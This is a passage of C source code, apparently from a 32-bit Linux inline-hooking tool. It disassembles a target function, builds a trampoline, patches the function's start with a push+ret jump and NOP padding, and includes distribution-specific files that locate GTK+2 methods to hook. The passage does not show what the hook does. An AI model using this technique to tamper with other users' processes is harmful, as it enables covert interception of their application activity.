    cs_insn *insn;

    size_t cs_count,
      trampoline_sz = 0,
      bytes_to_replaced = HOOK_PATCH_SZ,
      opcodes_sz;


    bytes_rep = GetBytesInstructionsReplaced((void *)function_addr,
      &bytes_to_replaced,
      bytes_to_replaced * 4);

    if (cs_open(CS_ARCH_X86,
      CS_MODE_32,
      &cs_handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open()\n");

      return -1;
    }

    cs_count = cs_disasm(cs_handle,
      (void *)function_addr,
      bytes_rep,
      function_addr,
      0,
      &insn);

    if (cs_count <= 0)
    {
      fprintf(stderr, "cs_disasm()\n");

      cs_close(&cs_handle);

      return -1;
    }

    //
    // Compose trampoline:
    //
    // if the incoming opcode (from the function to hook) is the first call, then we disassemble that function and then we hardcode
    // a mov to the pertinent register, (with kstool), as in the function __x86.get_pc_thunk.?? is assembled. That moves in e?x
    // the value of the next instruction after the call to it.
    //
    // if the incoming opcode is not a first call, is whatever different from the first, then we rebuild it with an ASM trick.
    //
    // if the incoming opcode is another one, we copy it to the trampoline.
    //

    int call_c = 0;

    *trampoline = NULL;

    for (i = 0; i < cs_count; i++)
    {
      if (strlen(insn[i].mnemonic) == 4
        && strncmp(insn[i].mnemonic, "call", 4) == 0)
      {
        call_c ++;

        if (call_c == 1)
        {
          size_t cs_count2;
          cs_insn *insn2;

          my_addr = insn[i].bytes[1]
            | (insn[i].bytes[2] << 8)
            | (insn[i].bytes[3] << 16)
            | (insn[i].bytes[4] << 24);
          my_addr = my_addr + insn[i + 1].address;

          cs_count2 = cs_disasm(cs_handle,
            (void *)my_addr,
            4,
            my_addr,
            0,
            &insn2);

          char *hardcoded_reg = NULL;

          if (strlen(insn2[0].mnemonic) == 3
            && strncmp(insn2[0].mnemonic, "mov", 3) == 0)
          {
            hardcoded_reg = strtok(insn2[0].op_str, ",");

            if (hardcoded_reg != NULL)
            {
              snprintf(asm_code,
                sizeof(asm_code),
                "mov %s, 0x%x",
                hardcoded_reg,
                (unsigned long) insn[i + 1].address);

              printf("%s\n", asm_code);

              asm_opcodes = Assemble(asm_code, &opcodes_sz);

              if (asm_opcodes != NULL)
              {
                *trampoline = realloc(*trampoline, trampoline_sz + opcodes_sz);
                memcpy((void *) *trampoline + trampoline_sz, asm_opcodes, opcodes_sz);
                trampoline_sz += opcodes_sz;
              }
            }
          }

          cs_free(insn2, cs_count2);
        }
        else
        {
          *trampoline = realloc(*trampoline, trampoline_sz + CALL_REBUILD_SZ);
          memcpy((void *) *trampoline + trampoline_sz, CALL_REBUILD, CALL_REBUILD_SZ);
          // compose absolute address needed for push + ret.
          my_addr = insn[i].bytes[1]
            | (insn[i].bytes[2] << 8)
            | (insn[i].bytes[3] << 16)
            | (insn[i].bytes[4] << 24);
          my_addr = my_addr + insn[i + 1].address;
          memcpy((void *) *trampoline + trampoline_sz + 4, &my_addr, 4);
          trampoline_sz += CALL_REBUILD_SZ;
        }
      }
      else
      {
        *trampoline = realloc(*trampoline, trampoline_sz + insn[i].size);
        memcpy((void *)*trampoline + trampoline_sz, insn[i].bytes, insn[i].size);
        trampoline_sz += insn[i].size;
      }
    }

    *trampoline = realloc(*trampoline, trampoline_sz + HOOK_PATCH_SZ);
    memcpy((void *) *trampoline + trampoline_sz, HOOK_PATCH, HOOK_PATCH_SZ);
    my_addr = function_addr + bytes_rep;
    memcpy((void *) *trampoline + trampoline_sz + 1, &my_addr, 4);
    trampoline_sz += HOOK_PATCH_SZ;

    printf("Trampoline:\n");
    Disasm((void *) *trampoline, trampoline_sz);

    cs_free(insn, cs_count);
    cs_close(&cs_handle);

    MprotectPages((unsigned long)*trampoline,
      trampoline_sz,
      PROT_EXEC | PROT_READ | PROT_WRITE);


    //
    // Patch function to hook (function_addr):
    //
    // Make the pages where the bytecode of the function are writable and then with the function of DbgChild, we could
    // get the bytes_rep and we know the patch size. So finally, after patch with push + ret opcodes and replace the 0xdeadbabe
    // with trampoline's address we can fill with NOPs and restore the pages protection.
    //

    MprotectPages(function_addr,
      HOOK_PATCH_SZ,
      PROT_EXEC | PROT_READ | PROT_WRITE);

    memcpy((void *) function_addr,
      HOOK_PATCH,
      HOOK_PATCH_SZ);

    memcpy((void *) function_addr + 1,
      &hook_entry,
      4);

    for (i = 0; i < bytes_rep - HOOK_PATCH_SZ; i ++)
    {
      memcpy((void *) function_addr + HOOK_PATCH_SZ + i,
        &nop,
        1);
    }

    MprotectPages(function_addr,
      HOOK_PATCH_SZ,
      PROT_EXEC | PROT_READ);

    printf("Function after patch:\n");
    Disasm((void *) function_addr, bytes_rep);

    //
    // Prepare HookEntry:
    //
    // Just replace the 0xdeadbabe address with the return address after the call of the routine in C lang.
    // That address is the address of the trampoline.
    //

    MprotectPages(hook_entry_addr + 1,
      4,
      PROT_EXEC | PROT_READ | PROT_WRITE);

    my_addr = (unsigned long) *trampoline;

    memcpy((void *) hook_entry_addr + 1,
      &my_addr,
      4);

    MprotectPages(hook_entry_addr + 1,
      4,
      PROT_EXEC | PROT_READ);

    return 0;
  }

#endif


/*
 * Include the Linux distribution functions dependant, for gathering the address of the needed methods of GTK+2 to hook.
 */

#if defined(OPENSUSE)
  #include "./suse.c"
#elif defined(DEBIAN)
  #include "./debian.c"
#elif defined(UBUNTU)
  #include "./ubuntu.c"
#endif
